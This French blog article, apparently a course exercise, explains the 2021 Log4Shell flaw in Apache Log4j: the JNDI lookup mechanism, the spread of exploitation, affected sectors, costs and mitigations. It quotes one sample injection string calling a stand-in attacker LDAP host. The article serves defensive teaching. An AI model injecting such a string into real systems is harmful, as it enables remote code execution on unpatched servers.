---
title: "TP 4 : Log4Shell : La faille Java qui a ébranlé Internet"
excerpt: "En 2021, une faille critique dans la bibliothèque Log4j a exposé des millions d'applications Java à des attaques à distance. Cet article analyse la vulnérabilité, les impacts mondiaux, et les stratégies de défense pour prévenir une exploitation future."
coverImage: "https://media.csoonline.com/images/article/2021/12/log4j_shell_log4shell_vulnerability_security_threat_danger_by_tiero_gettyimages-1317172885_2400x1600-100916381-large.jpg"
date: "2025-07-02T11:00:00.000Z"
author:
    name: JJ Kasper
    picture: "/assets/blog/authors/jj.jpeg"
ogImage:
    url: "https://media.csoonline.com/images/article/2021/12/log4j_shell_log4shell_vulnerability_security_threat_danger_by_tiero_gettyimages-1317172885_2400x1600-100916381-large.jpg"
---

Découverte en décembre 2021, **Log4Shell** est l’une des vulnérabilités les plus graves jamais identifiées. Présente dans la bibliothèque Java **Apache Log4j**, elle permet à un attaquant d’exécuter du code arbitraire à distance avec une simplicité déconcertante. Son impact est colossal, affectant des millions de serveurs dans le monde.

## Quelle est la vulnérabilité exploitée ?

La vulnérabilité, identifiée sous le nom **CVE-2021-44228**, affecte la bibliothèque de journalisation **Apache Log4j 2**, très utilisée dans les applications Java.

Le problème réside dans le traitement des chaînes de caractères contenant des expressions **JNDI** (Java Naming and Directory Interface), comme `${jndi:ldap://attacker.com/a}`. Log4j les interprète sans restriction, permettant à un attaquant de forcer l’application à charger du code malveillant depuis un serveur distant.

Cette faille est une **vulnérabilité d'exécution de code à distance (RCE)** accessible **sans authentification**.

## Comment l’attaque s’est-elle déroulée ?

Les attaquants ont simplement injecté des expressions `${jndi:...}` dans des champs de saisie (user-agent, formulaires, chat, logs d’erreur, etc.). Dès qu’un serveur vulnérable loguait cette chaîne, Log4j contactait un serveur LDAP malveillant et téléchargeait le code à exécuter, ouvrant ainsi la porte à une prise de contrôle totale.

Des **bots d'exploitation automatisés** ont rapidement scanné Internet pour exploiter la faille à grande échelle. L'attaque ne nécessite **aucune interaction humaine** ni authentification préalable.

## Qui a été touché ?

Pratiquement toutes les entreprises utilisant Java via :

-   **Serveurs Minecraft**, massivement exploités dès les premières heures
-   **Cloud providers** : AWS, Google Cloud, Azure
-   **Applications d’entreprise** : Elasticsearch, Apache Struts, Spring Boot, etc.
-   **Entreprises tech** : Apple, Twitter, Amazon, Cloudflare
-   **Secteur public** : ministères, collectivités, systèmes critiques exposés

## Quels ont été les impacts ?

-   **Fuite de données**, accès à distance, installation de backdoors
-   **Exploitation pour crypto-minage (cryptojacking)** et déploiement de ransomwares
-   **Stress intense sur les équipes de sécurité**
-   **Risque durable** : la faille est difficile à détecter et les dépendances Java sont omniprésentes

Certains chercheurs ont détecté **des millions de tentatives d’exploitation en moins de 48 heures**.

## Quel coût estimé ?

-   **Petite entreprise** : ~10 000 € à 100 000 € (en fonction de l'exposition et de la remédiation)
-   **Moyenne entreprise** : ~200 000 € à 1 million €
-   **Grande entreprise** : Plusieurs **dizaines de millions**
    -   Gartner estime que la faille pourrait coûter **plus de 10 milliards $** à l’échelle mondiale

## Comment s’en protéger ?

1. **Mettre à jour Log4j** vers la version 2.17 ou supérieure (ou remplacer la bibliothèque)
2. **Utiliser des firewalls applicatifs (WAF)** pour bloquer les chaînes JNDI
3. **Désactiver les résolutions JNDI dans Log4j**
4. **Surveiller les logs et endpoints** à la recherche d’expressions suspectes
5. **Recenser toutes les dépendances Java** et les auditer
6. **Appliquer une stratégie de Software Bill of Materials (SBOM)** pour suivre les composants logiciels

## Pourquoi est-ce difficile à éviter ?

-   Log4j est **intégré profondément** dans de nombreuses bibliothèques et frameworks Java
-   De nombreux développeurs ignoraient qu’ils utilisaient Log4j via une **dépendance transitive**
-   Les chaînes d’exploitation peuvent être **obfusquées**, rendant les tentatives d’injection difficiles à détecter
-   Certains environnements sont **très lents à patcher** (IoT, applications legacy, etc.)

## Dans le contexte de votre entreprise, que feriez-vous ?

-   Mettre en place une **cartographie des dépendances** (via des outils comme Syft ou OWASP Dependency-Check)
-   Déployer une **stratégie de détection d'anomalies dans les logs**
-   **Scanner les systèmes exposés** avec des outils comme log4j-detector
-   Mettre en œuvre un **plan de mise à jour continu** pour les dépendances critiques
-   Exiger un **SBOM** pour tous les nouveaux composants logiciels utilisés
-   Tester régulièrement l’environnement avec des **scans de vulnérabilités automatisés**

---
